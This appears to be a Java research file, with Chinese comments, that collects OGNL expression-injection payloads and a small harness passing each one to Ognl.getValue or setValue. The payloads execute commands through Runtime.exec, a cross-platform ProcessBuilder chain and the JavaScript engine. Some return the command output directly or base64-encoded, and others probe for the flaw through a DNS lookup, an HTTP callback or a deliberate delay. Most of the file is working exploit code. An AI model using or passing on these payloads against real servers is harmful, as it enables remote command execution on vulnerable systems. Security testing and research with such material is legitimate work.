package org.example;

import ognl.Ognl;
import ognl.OgnlContext;

/**
 * @author Whoopsunix
 */
public class OGNL {

    public static void main(String[] args) {
        /**
         * 无回显 get触发
         */
        String baseGetPayload = "@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')";
//        ognlGetValue(baseGetPayload);

        /**
         * 无回显 set触发
         */
        String baseSetPayload = "(@java.lang.Runtime@getRuntime().exec(\'open -a Calculator.app\'))(a)(b)";
//        ognlSetValue(baseSetPayload);

        /**
         * Ognl解析后，存在直接打印的情况
         * 直接套用 命令执行给的 InputStream 处理方式读取
         */
//        String IOUtilsPayload = "{(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream(),'UTF-8'))}";
//        String IOUtilsPayload1 = "{(new java.lang.String(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())))}";
        String ScannerPayload = "{(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream())).useDelimiter(\"\\\\A\").next()}";
        String StreamUtilsPayload = "{(new java.lang.String(@org.springframework.util.StreamUtils@copyToByteArray(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream())))}";

        // processBuilder形式构建
        String processBuilderPayload1 = "(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#inputStream=#process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#inputStream,'UTF-8'))";
        String processBuilderPayload2 = "{(#iswin=(new java.lang.Boolean(\"true\")).booleanValue())?(#cmds=(new java.lang.String[]{\"cmd.exe\",\"/c\",\"ipconfig\"})):(#cmds=(new java.lang.String[]{\"/bin/bash\",\"-c\",\"ifconfig\"})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(new java.io.ByteArrayOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

        /**
         * JS引擎
         */
        // 无回显
        String jsPayloadNormal = "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")')";
        String jsPayloadNormalSet = "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")')(a)(b)";
        // 回显
        String jsPayload = "(new javax.script.ScriptEngineManager()).getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();')";

        /**
         * base64加密
         */
        // 原生 > JDK8 todo
        String base64Encode = "(#inputStream=@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()).(@java.util.Base64@getEncoder().encodeToString((new java.util.Scanner(#inputStream).useDelimiter('\\\\A').next().getBytes())))";
//        // 用 IOUtils 实现
        String base64EncodeIOUtils = "(#str=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream(),'UTF-8')).(#base64=@java.util.Base64@getEncoder().encodeToString(#str.getBytes()))";

        /**
         * 探测
         */
        String DNSLOG = "@java.net.InetAddress@getByName('DNSLOG')";
        String HTTPLOG = "new java.net.URL('http://host').getContent()";
        // 延时
        String sleep = "@java.lang.Thread@sleep(10000)";


        Object obj = ognlGetValue(sleep);
        System.out.println(obj);
//        ognlSetValue(jsPayloadNormalSet);
    }

    /**
     * ognl.Ognl#getValue()
     */
    public static Object ognlGetValue(String payload) {
        try {
            System.out.println(payload);
            Object obj = Ognl.getValue(payload, null);
            return obj;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * ognl.Ognl#setValue()
     */
    public static void ognlSetValue(String payload) {
        try {
            Ognl.setValue(payload, new OgnlContext(), "");
        } catch (Exception e) {

        }
    }


    /**
     * org.apache.ibatis.ognl.Ognl.getValue()
     */
    public static void ognlGetValueIbatis(String payload) throws Exception {
        try {
            Object obj = org.apache.ibatis.ognl.Ognl.getValue(payload, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * org.apache.ibatis.ognl.Ognl.setValue()
     */
    public static void ognlSetValueIbatis(String payload) throws Exception {
        try {
            org.apache.ibatis.ognl.Ognl.setValue(payload, new OgnlContext(), "");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
